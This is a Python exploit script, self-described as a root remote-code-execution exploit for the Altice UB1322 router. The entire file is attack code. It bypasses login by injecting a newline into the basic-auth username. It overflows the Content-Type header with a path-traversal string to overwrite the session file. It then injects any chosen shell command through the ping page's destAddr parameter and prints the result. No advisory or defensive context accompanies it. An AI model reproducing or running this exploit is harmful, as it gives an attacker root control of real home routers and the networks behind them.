import requests
import urllib3
from argparse import ArgumentParser
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = ArgumentParser(description="an Altice UB1322 root RCE exploit")
parser.add_argument('-t', dest='ip', default="192.168.1.1", help='target IP')
parser.add_argument('-c', dest='cmd', required=True, help='cmd to run')
args = parser.parse_args()

base = f"https://{args.ip}/"
output = "/webs_clientside_14/.txt"
requests.get(base, auth=("\nISAUTH=1\n", ""), verify=0)

# buffer overflow in content-type overwrites session filename with log
head = {"Content-Type": "./"*68 + "../../rdklogs/logs/HTTPDlog.txt.0\0"}
# command injection in ping runs arbitrary cmd
params = {"destAddr": f'";({args.cmd})>{output};"'}
requests.get(base + "ping.cmd", params=params, headers=head, verify=0)
print(requests.get(base + ".txt", verify=0).text.strip())
